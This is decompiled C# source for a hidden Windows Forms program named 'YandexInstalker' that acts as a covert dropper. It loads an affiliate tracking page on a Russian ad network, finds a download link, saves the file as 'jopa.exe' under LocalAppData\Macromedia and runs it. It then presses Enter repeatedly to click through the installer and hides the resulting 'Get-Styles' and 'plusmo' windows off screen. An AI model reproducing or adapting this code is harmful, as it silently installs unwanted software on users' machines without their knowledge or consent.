using System;
using System.Collections;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace YandexInstalker;

[DesignerGenerated]
public class Form1 : Form
{
	private struct RECT
	{
		public long Left;

		public long Top;

		public long Right;

		public long Bottom;
	}

	private struct POINTAPI
	{
		public long x;

		public long y;
	}

	private struct WINDOWPLACEMENT
	{
		public long Length;

		public long flags;

		public long showCmd;

		public POINTAPI ptMinPosition;

		public POINTAPI ptMaxPosition;

		public RECT rcNormalPosition;
	}

	public delegate bool CallBack(IntPtr hWnd, int lParam);

	private IContainer components;

	[AccessedThroughProperty("wb")]
	private WebBrowser _wb;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("Timer4")]
	private Timer _Timer4;

	[AccessedThroughProperty("TimersTART")]
	private Timer _TimersTART;

	public static string gotit;

	public static string filename = ".exe";

	private WebClient wbp;

	private long hwndSelected;

	private string sClassSelected;

	private string sTitleSelected;

	private const int LB_SETTABSTOPS = 402;

	private const int GW_HWNDNEXT = 2;

	private const int GW_CHILD = 5;

	private const int GWW_ID = -12;

	private const int SW_SHOWNORMAL = 1;

	private const int SW_SHOWMINIMIZED = 2;

	private const int SW_SHOWMAXIMIZED = 3;

	private const int SW_SHOWNOACTIVATE = 4;

	private const int fwp_startswith = 0;

	private const int fwp_contains = 1;

	private Collection<IntPtr> ActiveWindows;

	private const int SW_HIDE = 0;

	internal virtual WebBrowser wb
	{
		get
		{
			return _wb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			WebBrowserDocumentCompletedEventHandler val = new WebBrowserDocumentCompletedEventHandler(wb_DocumentCompleted);
			if (_wb != null)
			{
				_wb.remove_DocumentCompleted(val);
			}
			_wb = value;
			if (_wb != null)
			{
				_wb.add_DocumentCompleted(val);
			}
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer4
	{
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			if (_Timer4 != null)
			{
				_Timer4.remove_Tick(eventHandler);
			}
			_Timer4 = value;
			if (_Timer4 != null)
			{
				_Timer4.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer TimersTART
	{
		get
		{
			return _TimersTART;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = TimersTART_Tick;
			if (_TimersTART != null)
			{
				_TimersTART.remove_Tick(eventHandler);
			}
			_TimersTART = value;
			if (_TimersTART != null)
			{
				_TimersTART.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		wbp = new WebClient();
		ActiveWindows = new Collection<IntPtr>();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		components = new Container();
		wb = new WebBrowser();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Timer3 = new Timer(components);
		Timer4 = new Timer(components);
		TimersTART = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)wb).set_Dock((DockStyle)5);
		wb.set_IsWebBrowserContextMenuEnabled(false);
		WebBrowser obj = wb;
		Point location = new Point(0, 0);
		((Control)obj).set_Location(location);
		WebBrowser obj2 = wb;
		Size minimumSize = new Size(20, 20);
		((Control)obj2).set_MinimumSize(minimumSize);
		((Control)wb).set_Name("wb");
		wb.set_ScriptErrorsSuppressed(true);
		WebBrowser obj3 = wb;
		minimumSize = new Size(292, 273);
		((Control)obj3).set_Size(minimumSize);
		((Control)wb).set_TabIndex(0);
		Timer1.set_Interval(1);
		Timer2.set_Interval(1);
		Timer3.set_Interval(1);
		Timer4.set_Interval(20);
		TimersTART.set_Enabled(true);
		TimersTART.set_Interval(15000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		minimumSize = new Size(292, 273);
		((Form)this).set_ClientSize(minimumSize);
		((Control)this).get_Controls().Add((Control)(object)wb);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	public bool Isdebug()
	{
		try
		{
			return File.Exists("D:\\mylog.txt");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		_ = ((!Isdebug()) ? 1u : 0u) | 1u;
		Point location = new Point(-1000, -1000);
		((Form)this).set_Location(location);
		((Control)this).set_Visible(false);
		TimersTART.set_Interval(1);
		TimersTART.set_Enabled(true);
	}

	private void TimersTART_Tick(object sender, EventArgs e)
	{
		TimersTART.set_Enabled(false);
		wb.Navigate("http://tracking.actionads.ru/aff_c?offer_id=280&aff_id=1202");
	}

	private void wb_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		Timer1.set_Enabled(true);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		Timer1.set_Enabled(false);
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = wb.get_Document().get_Links().GetEnumerator();
			while (enumerator.MoveNext())
			{
				HtmlElement val = (HtmlElement)enumerator.Current;
				string text = NewLateBinding.LateGet(val.get_DomElement(), (Type)null, "href", new object[0], (string[])null, (Type[])null, (bool[])null).ToString();
				if (text.Contains("getstat/up") & text.Contains("vktemy"))
				{
					gotit = text;
					NewLateBinding.LateCall(val.get_DomElement(), (Type)null, "FireEvent", new object[1] { "OnClick" }, (string[])null, (Type[])null, (bool[])null, true);
					Timer2.set_Enabled(true);
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		Timer2.set_Enabled(false);
		wbp.Proxy = null;
		wbp.DownloadFile(new Uri(gotit), TempFile());
		FileCOmpleted(null, null);
	}

	private void FileCOmpleted(object sender, AsyncCompletedEventArgs e)
	{
		checked
		{
			int num = wbp.ResponseHeaders!.Count - 1;
			int num2 = 0;
			string text;
			string text2;
			while (true)
			{
				if (num2 <= num)
				{
					text = wbp.ResponseHeaders![num2];
					text2 = "filename=";
					if (text.Contains("filename="))
					{
						break;
					}
					num2++;
					continue;
				}
				return;
			}
			int num3 = text.IndexOf(text2);
			filename = text.Substring(num3 + text2.Length, text.Length - num3 - text2.Length);
			Timer3.set_Enabled(true);
		}
	}

	public string TargetDir()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia\\";
	}

	public string TargetFile()
	{
		return TargetDir() + filename;
	}

	public string TempFile()
	{
		return TargetDir() + "jopa.exe";
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		Timer3.set_Enabled(false);
		try
		{
			File.Copy(TempFile(), TargetFile(), overwrite: true);
			Process process = Process.Start(TargetFile());
			process.WaitForInputIdle();
			long wnd = GetWnd("Get-Styles:");
			SetForegroundWindow(wnd);
			Thread.Sleep(100);
			int num = 0;
			do
			{
				wnd = GetWnd("Get-Styles:");
				SendKeys.Send("{ENTER}");
				Thread.Sleep(50);
				num = checked(num + 1);
			}
			while (num <= 10);
			wnd = GetWnd("Get-Styles:");
			ShowWindow(wnd, 0L);
			Timer4.set_Enabled(true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetDesktopWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetWindowPlacement(long hwnd, WINDOWPLACEMENT lpwndpl);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetWindowRect(long hwnd, RECT lpRect);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetClassNameA(long hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, long nMaxCount);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long MoveWindow(long hwnd, long x, long y, long nWidth, long nHeight, long bRepaint);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SendMessageA(long hwnd, long wMsg, long wParam, long lParam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SetForegroundWindow(long hwnd);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SetWindowPlacement(long hwnd, WINDOWPLACEMENT lpwndpl);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long ShowWindow(long hwnd, long nCommand5);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "FindWindow", SetLastError = true)]
	private static extern IntPtr FindWindow_1(string lpClassName, IntPtr zero);

	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "FindWindow", SetLastError = true)]
	private static extern IntPtr FindWindow_2(IntPtr zero, string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetWindow(long hwnd, long wCmd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowTextLength(IntPtr hwnd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(IntPtr hwnd, StringBuilder lpString, int cch);

	public string GetText(IntPtr hWnd)
	{
		int windowTextLength = GetWindowTextLength(hWnd);
		StringBuilder stringBuilder = new StringBuilder(checked(windowTextLength + 1));
		GetWindowText(hWnd, stringBuilder, stringBuilder.Capacity);
		return stringBuilder.ToString();
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetParent(long hwnd);

	private long GetWnd(string titlepart)
	{
		Collection<IntPtr> activeWindows = GetActiveWindows();
		foreach (IntPtr item in activeWindows)
		{
			string text = GetText(item).ToLower();
			if (text.Contains(titlepart.ToLower()))
			{
				return (long)item;
			}
		}
		return 0L;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int EnumWindows(CallBack Adress, int y);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool IsWindowVisible(IntPtr hwnd);

	public Collection<IntPtr> GetActiveWindows()
	{
		ActiveWindows.Clear();
		EnumWindows(Enumerator, 0);
		return ActiveWindows;
	}

	private bool Enumerator(IntPtr hwnd, int lParam)
	{
		if (IsWindowVisible(hwnd))
		{
			ActiveWindows.Add(hwnd);
		}
		return true;
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);

	private void Timer4_Tick(object sender, EventArgs e)
	{
		int num = checked((int)GetWnd("plusmo"));
		if (num != 0)
		{
			ShowWindow(num, 0L);
			MoveWindow(num, -1000L, 100L, 100L, 100L, 1L);
		}
	}
}
